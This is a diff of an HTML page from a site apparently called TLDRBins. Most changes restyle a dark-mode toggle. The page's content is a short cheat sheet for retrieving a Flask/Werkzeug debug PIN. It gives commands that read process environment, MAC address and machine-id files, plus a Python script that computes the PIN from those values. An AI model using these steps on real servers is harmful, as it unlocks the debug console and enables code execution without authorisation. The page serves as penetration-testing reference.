@@ -44,16 +44,20 @@
 </div>
     
 <style>
+ 
 
  
+.js-toggle-wrapper, .js-toggle {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    box-sizing: border-box;
+}
 
 .js-toggle-wrapper {
     display: table;
-
-     
     float: right;
     margin-left: auto;
-    margin-right: 0;
 }
 
 .js-toggle {
@@ -62,76 +66,60 @@
     position: relative;
     cursor: pointer;
     background-color: transparent;
-    border: 0;
-    padding: 0;
-    -webkit-touch-callout: none;
     user-select: none;
-    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
-    -webkit-tap-highlight-color: transparent;
-  }
-  
-  .js-toggle-screenreader-only {
-    border: 0;
-    clip: rect(0 0 0 0);
-    height: 1px;
-    margin: -1px;
-    overflow: hidden;
-    padding: 0;
+}
+
+.js-toggle-screenreader-only {
     position: absolute;
     width: 1px;
-  }
-  
-  .js-toggle-track {
+    height: 1px;
+    margin: -1px;
+    padding: 0;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+}
+
+.js-toggle-track {
     width: 50px;
     height: 24px;
-    padding: 0;
     border-radius: 30px;
     background-color: hsl(223, 61%, 44%);
-    transition: all 0.2s ease;
-  }
-  
-  .js-toggle-track-check {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    left: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 0;
-    transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-    transition: opacity 0.25s ease;
-  }
+    transition: background-color 0.2s ease;
+}
 
-  .js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-  }
-  
-  .js-toggle-track-x {
+.js-toggle-track-check,
+.js-toggle-track-x {
     position: absolute;
     width: 17px;
     height: 17px;
-    right: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 1;
+    top: 50%;
+    transform: translateY(-50%);
     transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-x {
+}
+
+.js-toggle-track-check {
+    left: 5px;
     opacity: 0;
-  }
-  
-  .js-toggle-thumb {
+}
+
+.js-toggle--checked .js-toggle-track-check {
+    opacity: 1;
+}
+
+.js-toggle-track-x {
+    right: 5px;
+    opacity: 1;
+}
+
+.js-toggle--checked .js-toggle-track-x {
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track {
+    background-color: hsl(222, 14%, 7%);
+}
+
+.js-toggle-thumb {
     position: absolute;
     top: 1px;
     left: 1px;
@@ -139,15 +127,12 @@
     height: 22px;
     border-radius: 50%;
     background-color: #fafafa;
-    box-sizing: border-box;
-    transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1) 0ms;
-    transform: translateX(0);
-  }
-  
-  .js-toggle--checked .js-toggle-thumb {
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+}
+
+.js-toggle--checked .js-toggle-thumb {
     transform: translateX(26px);
-    border-color: #19ab27;
-  }
+}
 </style>
 
 <script>
@@ -176,7 +161,6 @@
         switcher.classList.add('js-toggle--checked');
         body.classList.add('dark-mode');
     }
-
 </script>
   <p class="desc"></p>
 </header>
@@ -197,7 +181,7 @@
 </ul>
 <hr>
 <div class="content">
-<div id="dynamicFormContainer">
+  <div id="dynamicFormContainer">
 	<form id="dynamicForm" style="display: none;">
 	</form>
 	<div class="buttons center">
@@ -337,79 +321,67 @@ body.dark-mode #dynamicFormContainer button:hover {
     cursor: pointer;
     background: #424242;
 }
-
-
 </style>
-<h3 id="retrieve-flask-debug-pin">Retrieve Flask Debug Pin</h3>
+  <h3 id="retrieve-flask-debug-pin">Retrieve Flask Debug Pin</h3>
 <h4 id="1-get-user">1. Get user</h4>
-<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cat /proc/self/environ | grep -aE (&#39;USER&#39;|&#39;LOGNAME&#39;)
-</span></span></span></code></pre></div></div>
-<h4 id="2-get-full-path-of-the-application">2. Get full path of the application</h4>
-<div>
+</span></span></span></code></pre></div><h4 id="2-get-full-path-of-the-application">2. Get full path of the application</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+------------------------------+
 </span></span></span><span class="line"><span class="cl"><span class="go">| Get from Traceback debug log |
 </span></span></span><span class="line"><span class="cl"><span class="go">+------------------------------+
-</span></span></span></code></pre></div></div>
-<h4 id="3-get-mac-address">3. Get MAC address</h4>
-<div>
+</span></span></span></code></pre></div><h4 id="3-get-mac-address">3. Get MAC address</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cat /sys/class/net/eth0/address
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Convert to int
 </span></span><span class="line"><span class="cl"><span class="go">python3 -c &#34;print(int(&#39;&lt;MAC_ADDRESS&gt;&#39;.replace(&#39;:&#39;,&#39;&#39;), 16))&#34;
-</span></span></span></code></pre></div></div>
-<h4 id="4-create-machine-id-string">4. Create Machine ID String</h4>
-<div>
+</span></span></span></code></pre></div><h4 id="4-create-machine-id-string">4. Create Machine ID String</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d &#39;/&#39; -f1 | rev)
-</span></span></span></code></pre></div></div>
-<h4 id="5-update-public-and-private-bits-in-hacktricks-script">5. Update public and private bits in Hacktrick&rsquo;s Script</h4>
-<div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span>!/usr/bin/env python3
-</span></span><span class="line"><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">import hashlib
-</span></span></span><span class="line"><span class="cl"><span class="go">from itertools import chain
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">probably_public_bits = [
-</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;user&#39;,       # username
-</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;flask.app&#39;,  # modname (should be flask.app)
-</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;Flask&#39;,      # Flask / wsgi_app / DebuggedApplication
-</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;/app/venv/lib/python3.10/site-packages/flask/app.py&#39;  # full path of the app
-</span></span></span><span class="line"><span class="cl"><span class="go">]
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">private_bits = [
-</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;279275995014060&#39;,                  # Mac address
-</span></span></span><span class="line"><span class="cl"><span class="go">    &#39;d4e6cb65d59544f3331ea0425dc555a1&#39;  # machine_id string
-</span></span></span><span class="line"><span class="cl"><span class="go">]
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">h = hashlib.sha1()
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">for bit in chain(probably_public_bits, private_bits):
-</span></span></span><span class="line"><span class="cl"><span class="go">    if not bit:
-</span></span></span><span class="line"><span class="cl"><span class="go">        continue
-</span></span></span><span class="line"><span class="cl"><span class="go">    if isinstance(bit, str):
-</span></span></span><span class="line"><span class="cl"><span class="go">        bit = bit.encode(&#39;utf-8&#39;)
-</span></span></span><span class="line"><span class="cl"><span class="go">    h.update(bit)
-</span></span></span><span class="line"><span class="cl"><span class="go">h.update(b&#39;cookiesalt&#39;)
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">num = None
-</span></span></span><span class="line"><span class="cl"><span class="go">if num is None:
-</span></span></span><span class="line"><span class="cl"><span class="go">    h.update(b&#39;pinsalt&#39;)
-</span></span></span><span class="line"><span class="cl"><span class="go">    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">rv = None
-</span></span></span><span class="line"><span class="cl"><span class="go">if rv is None:
-</span></span></span><span class="line"><span class="cl"><span class="go">    for group_size in 5, 4, 3:
-</span></span></span><span class="line"><span class="cl"><span class="go">        if len(num) % group_size == 0:
-</span></span></span><span class="line"><span class="cl"><span class="go">            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
-</span></span></span><span class="line"><span class="cl"><span class="go">                          for x in range(0, len(num), group_size))
-</span></span></span><span class="line"><span class="cl"><span class="go">            break
-</span></span></span><span class="line"><span class="cl"><span class="go">    else:
-</span></span></span><span class="line"><span class="cl"><span class="go">        rv = num
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">print(rv)
-</span></span></span></code></pre></div></div>
-<br>
+</span></span></span></code></pre></div><h4 id="5-update-public-and-private-bits-in-hacktricks-script">5. Update public and private bits in Hacktrick&rsquo;s Script</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;user&#39;</span><span class="p">,</span>       <span class="c1"># username</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span>  <span class="c1"># modname (should be flask.app)</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span>      <span class="c1"># Flask / wsgi_app / DebuggedApplication</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/app/venv/lib/python3.10/site-packages/flask/app.py&#39;</span>  <span class="c1"># full path of the app</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;279275995014060&#39;</span><span class="p">,</span>                  <span class="c1"># Mac address</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d4e6cb65d59544f3331ea0425dc555a1&#39;</span>  <span class="c1"># machine_id string</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rv</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</span></span></code></pre></div>
 </div></div>
     
     <script src="/js/utils.js"></script>
@@ -417,8 +389,6 @@ body.dark-mode #dynamicFormContainer button:hover {
     <hr>
     <div class="footer-text">
         <div>© 2024 TLDRBins</div>
-        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
-                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
     </div>
 </footer>
 </body>
